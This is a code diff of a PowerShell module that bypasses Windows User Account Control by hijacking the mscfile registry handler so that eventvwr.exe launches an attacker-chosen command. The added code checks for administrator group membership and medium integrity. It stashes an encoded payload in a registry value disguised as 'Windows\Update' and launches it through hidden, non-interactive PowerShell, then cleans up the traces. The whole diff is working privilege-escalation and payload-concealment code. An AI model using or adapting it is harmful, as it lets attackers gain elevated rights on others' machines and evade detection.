@@ -37,18 +37,35 @@ This will write out "Is Elevated: True" to C:\UACBypassTest.
     $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
     $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
 
+    if(($(whoami /groups) -like "*S-1-5-32-544*").length -eq 0) {
+        "[!] Current user not a local administrator!"
+        Throw ("Current user not a local administrator!")
+    }
+    if (($(whoami /groups) -like "*S-1-16-8192*").length -eq 0) {
+        "[!] Not in a medium integrity process!"
+        Throw ("Not in a medium integrity process!")
+    }
+
     if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
         "UAC is set to 'Always Notify'. This module does not bypass this setting."
         exit
     }
     else{
         #Begin Execution
+
+        #Store the payload (due to eventvwr.exe length restrictions)
+        $RegPath = 'HKCU:Software\Microsoft\Windows\Update'
+        $parts = $RegPath.split('\');
+        $path = $RegPath.split("\")[0..($parts.count -2)] -join '\';
+        $name = $parts[-1];
+        $null = Set-ItemProperty -Force -Path $path -Name $name -Value $Command;
+
         $mscCommandPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
-        $Command = $pshome + '\' + $Command
+        $launcherCommand = $pshome + '\' + 'powershell.exe -NoP -NonI -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x'
         #Add in the new registry entries to hijack the msc file
         if ($Force -or ((Get-ItemProperty -Path $mscCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
             New-Item $mscCommandPath -Force |
-                New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null
+                New-ItemProperty -Name '(Default)' -Value $launcherCommand -PropertyType string -Force | Out-Null
         }else{
             Write-Warning "Key already exists, consider using -Force"
             exit
@@ -74,11 +91,14 @@ This will write out "Is Elevated: True" to C:\UACBypassTest.
             Start-Sleep -Seconds 5
         }
 
-        $mscfilePath = "HKCU:\Software\Classes\mscfile"
+        $mscfilePath = 'HKCU:\Software\Classes\mscfile'
+        $PayloadPath = 'HKCU:Software\Microsoft\Windows'
+        $PayloadKey = "Update"
 
         if (Test-Path $mscfilePath) {
             #Remove the registry entry
             Remove-Item $mscfilePath -Recurse -Force
+            Remove-ItemProperty -Force -Path $PayloadPath -Name $PayloadKey
             Write-Verbose "Removed registry entries"
         }
 
